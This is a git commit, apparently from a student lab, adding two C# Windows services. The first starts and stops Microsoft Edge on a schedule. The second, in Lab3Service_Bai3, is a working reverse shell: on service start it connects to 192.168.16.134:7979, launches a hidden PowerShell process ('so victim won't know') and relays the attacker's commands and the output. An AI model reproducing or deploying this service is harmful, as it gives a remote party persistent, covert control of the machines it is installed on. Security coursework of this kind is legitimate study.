466f997d20078c6064d93fc96d74bc226780a84d
DuongAnhVN <92222349+DuongAnhVN@users.noreply.github.com>
2023-04-18 09:17:22 +0700

    update

---
+++ Lab3Service_Bai2/Service1.cs
@@ -0,0 +1,136 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading.Tasks;
+using System.Timers;
+
+namespace Lab3Service
+{
+    public partial class Service1 : ServiceBase
+    {
+        string process_name = "";
+        string process_path = "";
+        Timer timer = new Timer(); // name space(using System.Timers;)
+        public Service1()
+        {
+            InitializeComponent();
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            WriteToFile("Service is started at " + DateTime.Now);
+            GetMsedgePathPath();
+            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
+            timer.Interval = 60000; //number in milisecinds
+            timer.Enabled = true;
+        }
+
+        protected override void OnStop()
+        {
+            WriteToFile("Service is stopped at " + DateTime.Now);
+        }
+        private void GetMsedgePathPath()
+        {
+            string msedgePath = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe", "", null);
+            if (File.Exists(msedgePath))
+            {
+                process_path = msedgePath;
+                process_name = Path.GetFileNameWithoutExtension(msedgePath);
+                WriteToFile($"Service get path OKE {process_path}, {process_name} : " + DateTime.Now);
+            }
+        }
+
+        private void OnElapsedTime(object source, ElapsedEventArgs e)
+        {
+            if (string.IsNullOrEmpty(process_name) && string.IsNullOrEmpty(process_path))
+            {
+                WriteToFile("The device does not have Msedge installed");
+                GetMsedgePathPath();
+                return;
+            }
+
+            DateTime now = DateTime.Now;
+            if (now.Hour >= 7 && now.Minute >= 0)
+            {
+                if (!IsProcessRunning(process_name))
+                {
+                    WriteToFile($"Service StartProcess {process_path} : {DateTime.Now}");
+                    StartProcess(process_path);
+                }
+                else
+                {
+                    WriteToFile($"Service {process_name} is running : {DateTime.Now}");
+                }
+            }
+            else if (now.Hour >= 21 && now.Minute >= 0)
+            {
+                if (IsProcessRunning(process_name))
+                {
+                    WriteToFile($"Service StopProcess {process_name} : {DateTime.Now}");
+                    StopProcess(process_name);
+                }
+                else
+                {
+                    WriteToFile($"Service {process_name} is stop : {DateTime.Now}");
+                }
+            }
+        }
+
+        private bool IsProcessRunning(string processName)
+        {
+            Process[] processes = Process.GetProcessesByName(processName);
+            foreach (Process process in processes)
+            {
+                if (process.MainWindowHandle != IntPtr.Zero)
+                {
+                    return true;
+                }
+            }
+            return false;
+        }
+        private void StartProcess(string processPath)
+        {
+            Process.Start(processPath);
+        }
+        private void StopProcess(string processName)
+        {
+            Process[] processes = Process.GetProcessesByName(processName);
+            foreach (Process process in processes)
+            {
+                process.Kill();
+            }
+        }
+        public void WriteToFile(string Message)
+        {
+            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
+            if (!Directory.Exists(path))
+            {
+                Directory.CreateDirectory(path);
+            }
+            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" +
+           DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
+            if (!File.Exists(filepath))
+            {
+                // Create a file to write to.
+                using (StreamWriter sw = File.CreateText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+            else
+            {
+                using (StreamWriter sw = File.AppendText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+        }
+    }
+}
---
+++ Lab3Service_Bai3/Service1.cs
@@ -0,0 +1,153 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace Lab3Service_Bai3
+{
+    public partial class Service1 : ServiceBase
+    {
+        Thread start;
+        static TcpClient client;
+        static Stream stream;
+        static StreamReader reader;
+        static StreamWriter writer;
+        public Service1()
+        {
+            InitializeComponent();
+        }
+        public void WriteToFile(string Message)
+        {
+            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
+            if (!Directory.Exists(path))
+            {
+                Directory.CreateDirectory(path);
+            }
+            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" +
+           DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
+            if (!File.Exists(filepath))
+            {
+                // Create a file to write to.
+                using (StreamWriter sw = File.CreateText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+            else
+            {
+                using (StreamWriter sw = File.AppendText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+        }
+        protected override void OnStart(string[] args)
+        {
+            start = new Thread(new ThreadStart(main));
+            start.Start();  
+        }
+
+        private void main()
+        {
+            WriteToFile($"{DateTime.Now.ToString("dd/MM/yyyy HH:mm")} Kiểm tra internet");
+            string hostname = "google.com";
+            Ping ping = new Ping();
+            PingReply reply = ping.Send(hostname);
+
+            if (reply.Status == IPStatus.Success)
+            {
+                WriteToFile($"{DateTime.Now.ToString("dd/MM/yyyy HH:mm")} start reverse shell");
+                using (client = new TcpClient("192.168.16.134", 7979))
+                {
+                    using (stream = client.GetStream())
+                    {
+                        using (reader = new StreamReader(stream))
+                        {
+                            using (writer = new StreamWriter(stream))
+                            {
+                                // start powershell process
+                                Process p = new Process();
+                                p.StartInfo.FileName = "powershell.exe";
+                                // no pop up windows so victim won't know
+                                p.StartInfo.CreateNoWindow = true;
+                                p.StartInfo.UseShellExecute = false;
+                                // redirect stream standard input & output to manually handling
+                                p.StartInfo.RedirectStandardOutput = true;
+                                p.StartInfo.RedirectStandardInput = true;
+                                p.StartInfo.RedirectStandardError = true;
+                                // add event handlers which send output to attacker
+                                p.OutputDataReceived += new DataReceivedEventHandler(OutputDataHandler);
+                                p.ErrorDataReceived += new DataReceivedEventHandler(ErrorDataHandler);
+                                p.Start();
+                                p.BeginOutputReadLine();
+                                p.BeginErrorReadLine();
+
+                                // allocate a new string
+                                StringBuilder input = new StringBuilder();
+                                while (true)
+                                {
+                                    // read from attacker's input
+                                    input.Append(reader.ReadLine());
+                                    // pass attacker's input to powershell process
+                                    p.StandardInput.WriteLine(input);
+                                    // input = ""
+                                    input.Remove(0, input.Length);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            else
+            {
+                WriteToFile($"{DateTime.Now.ToString("dd/MM/yyyy HH:mm")} Không thể kết nối internet.");
+            }
+        }
+
+        protected override void OnStop()
+        {
+            start.Abort();
+        }
+
+        private static void OutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder output = new StringBuilder();
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    // output = output from powershell process
+                    output.Append(outLine.Data);
+                    // send it to attacker (stream writer)
+                    writer.WriteLine(output);
+                    writer.Flush();
+                }
+                catch (Exception) { }
+            }
+        }
+
+        private static void ErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder output = new StringBuilder();
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    output.Append(outLine.Data);
+                    writer.WriteLine(output);
+                    writer.Flush();
+                }
+                catch (Exception) { }
+            }
+        }
+    }
+}
